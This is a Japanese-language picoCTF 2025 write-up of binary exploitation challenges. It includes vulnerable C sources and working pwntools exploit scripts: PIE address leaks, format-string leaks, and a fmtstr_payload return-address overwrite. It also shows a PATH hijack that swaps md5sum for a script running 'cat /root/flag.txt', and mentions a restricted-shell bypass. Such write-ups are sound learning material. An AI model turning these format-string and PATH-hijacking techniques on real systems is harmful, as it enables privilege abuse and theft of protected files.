+++
date = 2025-03-19
title = "picoCTF 2025 Writeup"
[taxonomies]
tags = ["CTF"]
+++

# これは何
picoCTF 2025 の writeupになります。Binary Exploitation 以外も解答しましたが、あんまり難しい問題でもなかったので記載しません。Binary Exploitation で競技中に解答できたのは
- PIE TIME
- PIE TIME 2
- hash-only-1

の3つでしたが、writeup には Echo Valley と hash-only-2 も記載します。

# PIE TIME
ソースとバイナリが配られます。以下にソースとchecksecの結果を示します。
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```
```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

プログラムの処理及びchecksecの結果から、win関数の先頭アドレスを入力として渡すことが出来れば良さそうです。さらにはmainのアドレスがリークしているので、リークした値から相対アドレスを引けばバイナリのベースが得られ、winの関数アドレスが計算できます。これらを考慮してsolverを書きます。

```python
from pwn import *

file = './vuln'
elf = context.binary = ELF(file)

p = remote("rescued-float.picoctf.net", 53964)
p.recvuntil(b'main: ')
leak_main = int(p.recvuntil('\n'), 16)
elf.address = leak_main - elf.sym['main']
p.sendline(hex(elf.sym['win']))
print(p.recvall().decode())
```

# PIE TIME 2
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);

  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  void (*foo)(void) = (void (*)())val;
  foo();
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  call_functions();
  return 0;
}
```

前回と同じでwinが存在しており、入力でwinの関数アドレスを渡すことは変わらないようですが、今度はFSBが存在しています。解法としてはFSBでスタック上のリターンアドレスをリークし、前回と同じ方法でベースアドレスを算出します。そうすればwin関数のアドレスをpwntoolsが計算してくれるので、それを文字列として送信するだけです。ごちゃごちゃしていると、リターンアドレスは19番目に位置していると分かるので、`%19$p`を送信してリターンアドレスを得ています。

```python
from pwn import *

file = './vuln'
elf = context.binary = ELF(file)
p = remote("rescued-float.picoctf.net", 61604)

p.recvuntil('name:')
p.sendline('%19$p')

main_leak = int(p.recvuntil('\n'), 16)

# リークしたアドレス - 実行前の相対アドレス = ベースアドレス
elf.address = main_leak - 0x1441 

p.recvuntil('0x12345: ')
p.sendline(hex(elf.sym['win']))
print(p.recvall().decode())
```

# hash-only-1
インスタンスを起動すると接続先のみが渡されます。接続してみるとカレントディレクトリには`flaghasher`というプログラムが存在しており、それを実行してみると、`/root/flag.txt`の内容を`md5sum`でハッシュ化して出力しているようでした。

```
$ ./flaghasher
Computing the MD5 hash of /root/flag.txt.... 

37b576b3ec8179c5714bcd173ce8c1cc  /root/flag.txt
```

また、プログラムがダウンロードできるとのことだったので、ダウンロードして`strings`にかけてみました。

```
$ strings flaghasher | grep md5sum
/bin/bash -c 'md5sum /root/flag.txt'
```

ここには載せていないのですが、この後`ghidra`での解析を行ってみると、どうやら上記文字列は`system()`を通じて実行されているようでした。この時点で、`flaghasher`自体は何の入力も受け付けていないため、`flaghasher`自体を攻撃するのではなく、それが利用するコマンドや環境を攻撃するべきかと考えました。もう少し調査を進めてみると `PATH`の変更が可能であったため、`md5sum`をこちらが用意した悪意のある同名の`md5sum`スクリプトにすりかえ、その中では`cat /root/flag.txt`を実行させれば良いのでは無いかと思いつきます。すり替えるためには`PATH`により優先順位の高いディレクトリを追加し、そのディレクトリの中に自前の`md5sum`を追加すれば良いはずです。

```
$ export PATH=/tmp:$PATH
$ echo 'cat /root/flag.txt' > md5sum
$ mv md5sum /tmp
$ ./flaghasher
```

これでフラグを入手できました。

# hash-only-2
hash-only-1と同じように接続先が渡されます。今後は`rbash`となっており、様々なコマンドやリダイレクトなどが制限された環境になっています。私は解答できませんでしたが、writeupを見る限りどうやら`bash`コマンドが使えたようです。そうすれば制限の無い通常のシェルを利用でき、この状態でhash-only-1と同じことをすればフラグが入手できました。

競技終了後に調べたところ、[Linux Restricted Shell Bypass](https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf)という資料を発見しました。今回の解法と似たようなことが書いてあります。競技中、`rbash`についてのバイパスを調べることを怠っていたので、とても後悔しました。

最近kurenaif氏のCTF入門講座が個人的に刺さっていたのですが、競技時間中に知らないことを調べないのはお話にならないことをhash-only-2でも痛感しました。

# Echo Valley
ソースとバイナリが配られます。ソースは下記。
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void print_flag() {
    char buf[32];
    FILE *file = fopen("/home/valley/flag.txt", "r");

    if (file == NULL) {
      perror("Failed to open flag file");
      exit(EXIT_FAILURE);
    }
    
    fgets(buf, sizeof(buf), file);
    printf("Congrats! Here is your flag: %s", buf);
    fclose(file);
    exit(EXIT_SUCCESS);
}

void echo_valley() {
    printf("Welcome to the Echo Valley, Try Shouting: \n");

    char buf[100];

    while(1)
    {
        fflush(stdout);
        fgets(buf, sizeof(buf), stdin);

        if (strcmp(buf, "exit\n") == 0) {
            printf("The Valley Disappears\n");
            break;
        }

        printf("You heard in the distance: ");
        printf(buf);
        fflush(stdout);
    }
    fflush(stdout);
}

int main()
{
    echo_valley();
    return 0;
}
```

解法は難しくなく、はじめにFSBの脆弱性を通じてリターンアドレスと退避された`rbp`を入手します。`gdb`などで調べると、退避された`rbp`の値から0x8を減算すると、そこにはリターンアドレスが存在していることが分かります。また、リターンアドレスは、当該命令が相対アドレスで`0x1413`と分かるので、リークしたリターンアドレスから`0x1413`を減算すればバイナリのベースアドレスが算出できると分かります。ベースアドレスが算出できれば、`pwntools`が`print_flag()`関数のアドレスも算出してくれるのでそれを利用できます。

準備が整ったので、「リターンアドレスのアドレス(`saved_rbp-0x8`)」に`print_flag()`のアドレスを書き込むように書式文字列を作成・送信すればフラグが入手できます。

```python
from pwn import *

file = './valley'
elf = context.binary = ELF(file)
#p = process(file)
p = remote("shape-facility.picoctf.net", 54075)

p.recvline()
p.sendline(b'%20$p.%21$p')
p.recvuntil(b'distance: ')

leak = p.recvuntil(b'\n').split(b'.')
elf.address = int(leak[1], 16) - 0x1413
addr_retaddr = int(leak[0], 16) - 0x8

print(f'base: {hex(elf.address)}')
print(f'loca: {hex(addr_retaddr)}')

payload = fmtstr_payload(6, {addr_retaddr: elf.sym['print_flag']}, write_size='short')
p.sendline(payload)
p.sendline(b'exit')

p.interactive()
```

私は競技時間内に解答できなかったのですが、これに関しては1つ謎が残っています。というのもベースアドレスを算出するために`0x1413`をここでは減算していますが、これは`objdump`などのコマンドで`main`が`call echo_valley`した次の命令アドレスを見れば、減算する値は`0x1413`であることを確認できます。これは納得できる話ですし、実際競技時間中に私も行いました。問題なのはここからで、私がダウンロードしたバイナリでは、`call echo_valley`の次の命令アドレスは`0x1315`だったのです。こればかりは見間違いでもなく、何度も確認していたはずです。それだというのに他のwriteupを見てみると`0x1413`を減算していたり、リターンアドレスから`0x1aa`を減算することで`print_flag`のアドレスとしていたりで、自分のオフセットとは何かが違うことに気づきました。そう思ってもう一度バイナリをダウンロードしてみると、何故か`call echo_valley`の次の命令アドレスは`0x1413`だったのです。これは私が何かを間違えたのか、それもバイナリが何か変わったのか、何にせよ発狂しました。

あと`write_size='short'`が分かりません。2byteごとに値を書き込んでいくものだと思っていますが、`int`や`byte`では成功しませんでした。`byte`はペイロードが100byteを超えていたのでさもありなん。`int`は超えていないのに成功しない -> 意味わかんない

# 終わりに
exploitの自信を砕かれました。驕らずに生きていきます。
